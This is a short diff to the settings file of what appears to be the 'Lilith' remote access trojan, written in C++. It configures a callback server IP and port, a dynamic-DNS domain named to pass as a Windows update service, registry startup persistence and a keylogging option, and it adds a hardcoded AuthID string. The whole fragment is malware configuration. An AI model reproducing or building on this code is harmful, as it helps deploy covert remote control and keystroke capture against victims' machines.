@@ -5,6 +5,7 @@ std::string Settings::serverIP = "127.0.0.1";		//server ip
 int Settings::serverPort = 1337;	//server port
 
 std::string Settings::fileName = "lilithDEBUG.exe";					//file name
+char AuthID[100] = "tcidefkoasjfklsafjgkllejrioeufGerajksklHJKHU66799"; //Auth ID
 std::string Settings::folderName = "lilithDEBUG folder";					//name of folder where file is located
 std::string Settings::startupName = "lilithDEBUG startup";		//startup name in registry / taskmgr
 std::string Settings::logFileName = "log.txt";								//name of log file
@@ -20,6 +21,7 @@ bool Settings::logKeys = false;	//[EARLY STAGE, VERY RESOURCE-DEMANDING]	//speci
 #else
 
 std::string Settings::serverIP = "sample.ip.net";	/*windistupdate.ddns.net*/	//server ip
+std::string AuthID = "tcidefkoasjfklsafjgkllejrioeufGerajksklHJKHU66799"; //Auth ID
 int Settings::serverPort = 1337;	//server port
 
 std::string Settings::fileName = "lilithRELEASE.exe";					//file name
